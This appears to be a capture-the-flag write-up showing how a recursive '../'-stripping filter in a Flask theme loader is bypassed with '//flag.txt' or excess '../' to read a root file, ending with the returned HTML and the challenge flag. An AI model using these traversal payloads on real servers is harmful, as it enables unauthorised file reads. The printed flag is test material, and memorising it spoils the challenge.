```python
def filter_path(path):
    # print(path)
    path = path.replace("../", "")
    try:
        return filter_path(path)
    except RecursionError:
        # remove root / from path if it exists
        if path[0] == "/":
            path = path[1:]
        print(path)
        return path
```

Dockerfile:
```Dockerfile
FROM python:3.10-slim-buster

RUN pip3 install flask
COPY flag.txt /

WORKDIR /app
COPY app/* /app/
copy app/templates/* /app/templates/
copy app/themes/* /app/themes/

EXPOSE 5000

ENTRYPOINT ["python3", "app.py"]
```

we can discover that flag.txt is located at `/` path, the objetive is to load `flag.txt` as custom css file.

Two solution:
1. put tons of `../` to hit the error
2. even don't need `../`, just put `//flag.txt` to get the file

then we get:
```html
<!DOCTYPE html>
<html>
  <head>
    <title>Factorial Calculator</title>
    <!-- inline styles passed into the template -->
    <style>
        amateursCTF{h1tt1ng_th3_r3curs10n_l1mt_1s_1mp0ssibl3}
    </style>
  </head>
  <body>
    <h1>Factorial Calculator</h1>
    <form method="POST">
      <label for="number">Enter a number:</label>
      <input type="text" name="number" id="number" />
      <input type="submit" value="Calculate" />
    </form>
    
    <p>Available themes:</p>
        <a href="?theme=themes/theme1.css">cool</a>
        <a href="?theme=themes/theme2.css">warm</a>
    <ul></ul>
  </body>
</html>
```
